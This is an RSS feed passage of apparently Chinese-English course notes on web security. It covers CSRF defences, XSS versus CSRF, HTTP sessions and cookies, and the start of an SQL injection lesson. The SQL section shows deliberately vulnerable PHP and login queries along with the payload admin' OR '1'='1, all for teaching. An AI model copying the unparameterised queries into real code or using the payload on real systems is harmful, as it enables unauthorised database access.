&lt;li&gt;Double Submit Cookie
&lt;ul&gt;
&lt;li&gt;Every transaction request must include a random value in both a cookie and as a request parameter&lt;/li&gt;
&lt;li&gt;如何防护：&lt;br&gt;
用户在登录时生成一个随机值，并在后续的每个请求中将该值同时包含在 Cookie 和请求参数中。&lt;br&gt;
服务器检查这两个值是否匹配，不匹配则拒绝请求。&lt;/li&gt;
&lt;li&gt;优势：攻击者无法同时控制 Cookie 和请求参数，防止了 CSRF 攻击。&lt;/li&gt;
&lt;li&gt;示例：&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// Set cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Set-Cookie: csrfToken=xyz123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; // Form submission includes the token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; POST /transfer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Cookie: csrfToken=xyz123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; Body: token=xyz123&amp;amp;acct=CHARLIE&amp;amp;amount=1000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;User Interaction
&lt;ul&gt;
&lt;li&gt;Involve the user in the transaction (e.g. one-time verification code, CAPTCHA, etc.)&lt;/li&gt;
&lt;li&gt;如何防护：在重要操作（如转账、密码修改等）中使用一次性验证码（OTP）、CAPTCHA 或类似机制，要求用户主动确认操作。&lt;br&gt;
通过用户的主动参与，确保请求是由用户发起的，而不是由恶意脚本伪造的。&lt;/li&gt;
&lt;li&gt;优势：阻止自动化 CSRF 攻击，提高了用户操作的安全性。&lt;/li&gt;
&lt;li&gt;示例：在转账页面中要求用户输入发送到其手机的一次性验证码（OTP）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;XSS VS CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#XSS VS CSRF&#34;&gt;#&lt;/a&gt;XSS VS CSRF&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方面&lt;/th&gt;
&lt;th&gt;XSS (Cross-Site Scripting)&lt;/th&gt;
&lt;th&gt;CSRF (Cross-Site Request Forgery)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;攻击目标&lt;/td&gt;
&lt;td&gt;执行恶意代码，控制用户浏览器&lt;/td&gt;
&lt;td&gt;利用用户的身份认证，进行未授权请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;危害&lt;/td&gt;
&lt;td&gt;窃取敏感信息、劫持会话、操纵网页内容&lt;/td&gt;
&lt;td&gt;未授权更改数据、提交表单等敏感操作&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;原理&lt;/td&gt;
&lt;td&gt;注入恶意代码，使浏览器执行攻击者的脚本&lt;/td&gt;
&lt;td&gt;利用用户的已登录状态，发送伪造的请求&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;防御措施&lt;/td&gt;
&lt;td&gt;输入过滤、内容安全策略 (CSP)、HttpOnly Cookie&lt;/td&gt;
&lt;td&gt;CSRF 令牌、检查 Referer Header、SameSite Cookie&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/Web-Application-Security/</guid>
            <title>Web Application Security</title>
            <link>http://example.com/course/Web-Application-Security/</link>
            <category>software security</category>
            <category>HTTP</category>
            <category>OSI</category>
            <pubDate>Wed, 30 Oct 2024 21:17:47 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Overall&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Overall&#34;&gt;#&lt;/a&gt;Overall&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Web Application Stack&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672216036891d.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;li&gt;OSI Network Protocol Stack&lt;br&gt;
More in Network System&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6722160374233.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;li&gt;Web Applications&lt;br&gt;
Security problem is usually to do with dynamic creation of web contents&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672216b529859.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;HTTP&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#HTTP&#34;&gt;#&lt;/a&gt;HTTP&lt;/h1&gt;
&lt;h2 id=&#34;HTTP&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#HTTP&#34;&gt;#&lt;/a&gt;HTTP&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;HyperText Transport Protocol (HTTP)&lt;br&gt;
HTTP is a request/response protocol for communicating between web clients and web servers.&lt;br&gt;
A web client sends a request to a particular web server for a particular resource (identified by a URL) and the web server responds with some kind of data (often HTML data)&lt;/li&gt;
&lt;li&gt;HTTP Request Messag&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Send TCP/IP message to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5leGFtcGxlLmNvbQ==&#34;&gt;www.example.com&lt;/span&gt; on port 80 containing the following:&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672217d602618.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;HTTP Request Methods&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Method&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;GET&lt;/td&gt;
&lt;td&gt;Retrieve information&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;POST&lt;/td&gt;
&lt;td&gt;Request some operation be performed&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PUT&lt;/td&gt;
&lt;td&gt;Provide new information&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DELETE&lt;/td&gt;
&lt;td&gt;Request something be removed from server&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;HEAD&lt;/td&gt;
&lt;td&gt;Same as GET except that only header info is returned&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OPTIONS&lt;/td&gt;
&lt;td&gt;Request information about communication options available&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TRACE&lt;/td&gt;
&lt;td&gt;Used for testing and diagnosing problems&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;CONNECT&lt;/td&gt;
&lt;td&gt;Used for tunnelling using proxies&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;HTTP Response Message&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672217d60533f.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;li&gt;HTTP is a Stateless Protocol&lt;br&gt;
HTTP is said to be a stateless protocol because each request is handled independently&lt;br&gt;
Assumes no memory of requests that came before current request&lt;br&gt;
If a web server receives a number of HTTP requests from the same client, they are each handled by the server in exactly the same way as they would, had they been sent from different clients.&lt;/li&gt;
&lt;li&gt;HTML Forms: the GET Method&lt;br&gt;
The GET method sends encoded data appended to the URL string&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;The data is separated from the URL by a ‘?’&lt;/li&gt;
&lt;li&gt;The encoded data and any path information are placed in the CGI environment variables  &lt;code&gt;QUERY_STRING&lt;/code&gt;  and  &lt;code&gt;PATH_INFO&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;HTML Forms: the Post Method&lt;br&gt;
The POST method sends encoded data in the body section of the request&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Data in the body is encoded in the same way as in the GET method&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Feature&lt;/th&gt;
&lt;th&gt;GET&lt;/th&gt;
&lt;th&gt;POST&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;用途&lt;/td&gt;
&lt;td&gt;通常用于信息检索，不会改变服务器状态&lt;/td&gt;
&lt;td&gt;提交数据进行处理，可能更新服务器或数据库状态&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;可见性&lt;/td&gt;
&lt;td&gt;参数在 URL 中可见，易于调试&lt;/td&gt;
&lt;td&gt;参数隐藏在请求主体中&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;安全性&lt;/td&gt;
&lt;td&gt;不适合提交密码等敏感信息&lt;/td&gt;
&lt;td&gt;不提供安全的隐私保护&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;长度限制&lt;/td&gt;
&lt;td&gt;受 URL 最大字符长度限制&lt;/td&gt;
&lt;td&gt;受服务器可接受的数据量限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;缓存性&lt;/td&gt;
&lt;td&gt;可以被缓存&lt;/td&gt;
&lt;td&gt;必须重新传输数据，且不会自动缓存&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;HTTP Sessions&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#HTTP Sessions&#34;&gt;#&lt;/a&gt;HTTP Sessions&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;HTTP Sessions&lt;br&gt;
A sequence of requests and responses from one browser to one (or more) sites&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Session can be long or short
&lt;ul&gt;
&lt;li&gt;Google advertising tracking: 1+ years&lt;/li&gt;
&lt;li&gt;Google Mail login: 2 weeks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Authorise user once, and all subsequent requests are tied to user
&lt;ul&gt;
&lt;li&gt;Without session management, users would have to constantly reauthenticate&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web application environments (ASP, PHP, etc.) provide session tokens&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Session Tokens&lt;br&gt;
Identifying the specific session instance&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/67221c58289ab.png&#34; alt=&#34;img&#34;&gt;
&lt;ol&gt;
&lt;li&gt;Session Tokens in URLs&lt;br&gt;
The session token is part of the URL and will be sent to the web server through HTTP GET requests&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;E.g. &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5leGFtcGxlLmNvbS9idXkuYXNwP2FydGljbGU9Mjc3ODE7c2Vzc2lvbmlkPUlFNTU3OTkwMTU3OA==&#34;&gt;http://www.example.com/buy.asp?article=27781;sessionid=IE5579901578&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;This mechanism works even in case of client security restrictions (e.g., no cookies are allowed)&lt;br&gt;
Problems:&lt;/li&gt;
&lt;li&gt;All information contained in the URL might be stored in firewall or proxy log files
&lt;ul&gt;
&lt;li&gt;Could simply be printed out with the web page on a shared printer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The URL, including sensitive data, can be sent in the HTTP referrer field to other web servers&lt;/li&gt;
&lt;li&gt;Imply a high risk of sensitive session data being disclosed to unauthorised third parties&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;HTML Forms with Hidden Fields&lt;br&gt;
Session token and information can be included in hidden fields in a form&lt;br&gt;
Works even in case of user client security restrictions, e.g., no cookies or JavaScript&lt;br&gt;
Does not provide protection mechanisms such as session expiration&lt;br&gt;
Cannot last beyond a single interactive session&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;FORM&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;METHOD&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;ACTION&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/cgi-bin/order_goods.pl&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;INPUT&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;TYPE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;NAME&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;customerid&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;VALUE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0815&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;INPUT&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;TYPE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;NAME&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;valid_order&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;VALUE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;yes&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;INPUT&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;TYPE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;NAME&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;productid&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;VALUE&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;4711&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;FORM&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code&gt;3. HTTP Cookies
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Can be set either using HTTP headers or JavaScript&lt;br&gt;
An extra response header is added as follows to save information to the client&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;id=321328765; domain=.qut.edu.au; path=/cgi-bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;When a user sends an HTTP request for a URL for which the client machine&lt;br&gt;
holds a cookie, an extra HTTP header is added to the client request every time&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie:id=321328765&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Other attributes: Expires, Domain, HttpOnly, Path, Port, Secure&lt;br&gt;
&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/672221a731746.png&#34; alt=&#34;img&#34;&gt;&lt;br&gt;
3.  Session tokens Risk&lt;br&gt;
1. Predictable Tokens&lt;br&gt;
- Counter (Verizon Wireless)&lt;br&gt;
- Weak MAC (WSJ)&lt;br&gt;
- token = {userid,  MAC_k(userid) }&lt;br&gt;
- Apache Tomcat&lt;br&gt;
-  &lt;code&gt;generateSessionID()&lt;/code&gt;  uses MD5 but with a weak pseudorandom number generator &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9yZXNlYXJjaC93cC1jb250ZW50L3VwbG9hZHMvMjAxNi8wMi9nbTA1LnBkZg==&#34;&gt;CT-RSA 2005&lt;/span&gt;&lt;br&gt;
- PHP&lt;br&gt;
-  &lt;code&gt;create_session_id&lt;/code&gt;  uses weak pseudorandom number generator &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxMC9NYXIvNTE5&#34;&gt;seclists.org&lt;/span&gt;&lt;br&gt;
2. Cookie Theft&lt;br&gt;
 一些网站仅加密登录过程，而不加密会话 Cookie，从而导致会话令牌容易被截获&lt;br&gt;
 Example 1: login over HTTPS, but subsequently use HTTP&lt;br&gt;
- 在不安全的网络环境（如无线咖啡馆）中，Cookie 可能被窃取。&lt;br&gt;
- Other reasons why session token sent in the clear&lt;br&gt;
- HTTPS/HTTP mixed content pages at site&lt;br&gt;
- Man-in-the-middle attacks on SSL&lt;br&gt;
- &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb2RlYnV0bGVyLmNvbS8yMDEwLzEwLzI0L2ZpcmVzaGVlcC8=&#34;&gt;Firesheep&lt;/span&gt; Firefox extension performs this attack&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Example 2: Cross-Site Scripting (XSS) attacks
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/SQL-Injection/</guid>
            <title>SQL Injection</title>
            <link>http://example.com/course/SQL-Injection/</link>
            <category>software security</category>
            <category>SQL</category>
            <pubDate>Wed, 30 Oct 2024 12:17:45 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL Injection&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#SQL Injection&#34;&gt;#&lt;/a&gt;SQL Injection&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Exploit vulnerabilities in input validation to run arbitrary commands in the database
&lt;ul&gt;
&lt;li&gt;Using user input to construct dynamic SQL statements to access the database&lt;/li&gt;
&lt;li&gt;Using stored procedures that are passed strings that contain unfiltered user input&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attacker can execute arbitrary commands in the database
&lt;ul&gt;
&lt;li&gt;Worse if the application uses a privileged account to connect to the database&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$selecteduser&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;];  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT Username, Key FROM Key &amp;quot;&lt;/span&gt; .  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;WHERE Username=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$selecteduser&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;variable&#34;&gt;$rs&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;executeQuery&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sql&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在上述代码中， &lt;code&gt;$selecteduser&lt;/code&gt;  是从用户输入中直接获取的，它被无过滤地插入到 SQL 查询中。由于没有对  &lt;code&gt;$selecteduser&lt;/code&gt;  进行任何过滤或转义，攻击者可以在输入中添加恶意的 SQL 语句，改变原始查询的含义。假设攻击者提供以下输入作为 user 参数：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;admin&lt;span class=&#34;string&#34;&gt;&amp;#x27; OR &amp;#x27;&lt;/span&gt;1&lt;span class=&#34;string&#34;&gt;&amp;#x27;=&amp;#x27;&lt;/span&gt;1 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这将导致查询变成：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; Username, Key &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; Key &lt;span class=&#34;keyword&#34;&gt;WHERE&lt;/span&gt; Username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这种情况下， &lt;code&gt;OR &#39;1&#39;=&#39;1&#39;&lt;/code&gt;  永远为真，这意味着数据库将返回所有用户的信息，而不仅仅是  &lt;code&gt;admin&lt;/code&gt;  用户的信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/30/6721ec7cbba70.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;Example&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Example&#34;&gt;#&lt;/a&gt;Example&lt;/h1&gt;
&lt;p&gt;SQL Injections Can be Used to …&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Login&lt;br&gt;
SQL 注入 是一种通过操控用户输入，使之直接嵌入 SQL 查询，从而改变查询逻辑的攻击方式。攻击者可以利用这种方式获取未经授权的数据库访问，甚至获取敏感数据&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Example&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;set&lt;/span&gt; userFound&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;execute&lt;/span&gt;( &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;SELECT * FROM USERS WHERE &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    username=&amp;#x27;$username&amp;#x27; AND password=&amp;#x27;$password&amp;#x27;;&amp;quot;); 